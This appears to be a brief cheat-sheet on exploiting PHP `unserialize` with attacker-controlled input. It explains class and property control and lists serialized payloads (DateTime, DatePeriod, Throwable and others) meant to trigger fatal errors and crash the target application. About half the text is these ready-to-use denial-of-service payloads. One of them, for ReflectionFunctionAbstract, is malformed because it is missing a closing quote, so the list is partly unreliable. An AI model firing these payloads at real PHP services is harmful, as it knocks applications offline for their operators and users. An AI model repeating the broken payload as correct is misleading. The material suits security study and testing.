When PHP `unserialize` is called on user-controlled input, can lead to full control over the object class name and properties.
Can't put function code though.
Can still be used to assign to another class in the binary or native in PHP.
To exploit, can copy the code of this class in a PHP sandbox, modify the field types you want, define an object of it and print the output of `serialize` of it.
TODO details.
## Crashing the program (exit)
Some objects when initialized with invalid parameters will trigger fatal error and crash the program.
Some examples:
- `DateTime`
- `DateTimeImmutable`
- `DateTimeZone`
- `DatePeriod`
- `Throwable`
- `Traversable`
- Any abstract class, such as `ReflectionFunctionAbstract`
Payloads:
- `O:8:"DateTime":0:{}`
- `O:10:"DatePeriod":0:{}`
- `O:9:"Throwable":0:{}`
- `O:11:"Traversable":0:{}`
- `O:26:"ReflectionFunctionAbstract:0:{}`